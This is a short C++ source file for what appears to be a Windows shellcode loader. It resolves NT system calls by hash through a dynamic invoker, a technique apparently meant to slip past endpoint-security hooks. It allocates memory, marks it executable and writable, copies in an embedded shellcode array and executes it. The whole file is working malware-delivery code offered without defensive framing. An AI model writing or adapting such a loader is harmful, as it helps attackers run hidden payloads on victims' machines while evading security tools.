#include <iostream>
#include <Windows.h>
#include "Tools.h"
#include "Struct.h"
#include "ShellcodeExec.h"
#include "shellcode.h"
#include "PIGSyscall.hpp"
#include "definition.h"
#include "Function.hpp"

static auto& dynamicInvoker = DynamicInvoker::get_instance();

int main() {
	initAllFunc();

	ExecuteShellcodeStruct execStruct = { 0 };
	LPVOID lpMem = NULL;
	SIZE_T size = sizeof(shellcode);

	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtAllocateVirtualMemoryStruct.funcAddr, NtAllocateVirtualMemoryStruct.funcHash,
	(HANDLE)-1,
	&lpMem,
	0,
	&size,
	MEM_RESERVE | MEM_COMMIT,
	PAGE_READWRITE);
	DWORD	dwOldProtection = NULL;

	status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &lpMem, &size, PAGE_READWRITE, &dwOldProtection);

	status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &lpMem, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);

	DebugPrintA("Error : %d\n", GetLastError());
	// ============================ EXECUTE =========================
	memcpy(lpMem, shellcode, sizeof(shellcode));
	execStruct.lpMem = lpMem;
	execStruct.memSize = sizeof(shellcode);
	ExecuteShellcode(&execStruct);
	// ============================ EXECUTE END =========================

}